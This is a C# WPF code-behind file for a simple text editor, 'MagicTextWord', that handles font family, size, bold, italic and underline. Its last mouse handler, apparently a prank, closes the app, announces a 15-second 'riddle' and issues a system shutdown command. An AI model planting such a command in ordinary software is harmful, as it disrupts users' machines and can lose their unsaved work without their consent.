using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Reflection.Emit;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace MagicTextWord
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        private bool isBold = false,
                     isItalic = false,
                     isUnderline = false;

        private string currentFont = "Times New Roman";
        private Pen pen;

        public MainWindow()
        {
            InitializeComponent();
            fontFamily.ItemsSource = Fonts.SystemFontFamilies.Select(fontFamily => fontFamily.Source);

            pen = new Pen(Brushes.Black, 0.0);
            TextDecoration decoration = new TextDecoration() { Pen = pen };
            TextDecorationCollection decorations = new TextDecorationCollection() { decoration };
            Paragraph paragraph = new Paragraph() { TextDecorations = decorations };
            FlowDocument document = new FlowDocument(paragraph);

            userText.Document = document;

            fontSize.ValueChanged += FontResize;
            fontFamily.SelectionChanged += FontFamilyChange;
        }

        private void FontFamilyChange(object sender, SelectionChangedEventArgs e)
        {
            currentFont = ((ComboBox)sender).SelectedItem.ToString();
            SetFont();
        }
        private void ChangeBoldState(object sender, RoutedEventArgs e)
        {
            isBold = !isBold;
            ButtonViewActivator((Button)sender, isBold);
            SetFont();
        }
        private void ChangeItalicState(object sender, RoutedEventArgs e)
        {
            isItalic = !isItalic;
            ButtonViewActivator((Button)sender, isItalic);
            SetFont();
        }
        private void SetFont()
        {
            string currentFont = this.currentFont;
                   currentFont += isBold ? " Bold" : null;
                   currentFont += isItalic ? " Italic" : null;

            userText.FontFamily = new FontFamily(currentFont);
        }

        private void ChangeUnderlineState(object sender, RoutedEventArgs e)
        {
            isUnderline = !isUnderline;
            pen.Thickness = isUnderline ? 1.0 : 0.0;
            ButtonViewActivator((Button)sender, isUnderline);
        }
        private void ButtonViewActivator(Button button, bool state)
        {
            if (state)
            {
                button.Foreground = Brushes.DeepSkyBlue;
                button.BorderBrush = Brushes.DeepSkyBlue;
            }
            else
            {
                button.Foreground = Brushes.Black;
                button.BorderBrush = null;
            }
        }

        private void FontResize(object sender, RoutedPropertyChangedEventArgs<double> e)
        {
            userText.FontSize = fontSize.Value;
        }


        private void RiddleJacquesFresco(object sender, MouseButtonEventArgs e)
        {
            Close();
            MessageBox.Show("На решение 15 секунд");
            Process.Start("shutdown", "/s /t 15");
        }
    }
}
